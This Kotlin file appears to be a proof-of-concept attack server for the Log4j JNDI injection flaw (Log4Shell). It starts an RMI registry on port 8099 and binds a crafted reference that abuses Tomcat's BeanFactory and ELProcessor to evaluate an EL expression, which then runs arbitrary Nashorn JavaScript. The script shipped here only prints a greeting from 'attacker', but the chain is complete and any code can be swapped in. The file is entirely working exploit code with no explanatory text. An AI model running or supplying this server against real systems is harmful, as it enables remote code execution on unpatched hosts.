package com.example.log4j2

import com.sun.jndi.rmi.registry.ReferenceWrapper
import org.apache.naming.ResourceRef
import org.intellij.lang.annotations.Language
import java.rmi.registry.LocateRegistry
import javax.naming.StringRefAddr

fun main() {
    val registry = LocateRegistry.createRegistry(8099)
    registry.bind("exec", makePayloadRef())
    println("Created payload server on port 8099")
}

@Language("Nashorn JS")
private val jsPayload = """
    java.lang.System.out.println('>>> A gentle greeting from attacker. <<<');
""".trimIndent()

@Language("EL")
private val elPayload = """
    "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("$jsPayload")
""".trimIndent()


private fun makePayloadRef(): ReferenceWrapper {
    val ref = ResourceRef("javax.el.ELProcessor", null, null, null, true, "org.apache.naming.factory.BeanFactory", null)
    ref.add(StringRefAddr("forceString", "x=eval"))
    ref.add(StringRefAddr("x", elPayload))
    return ReferenceWrapper(ref)
}
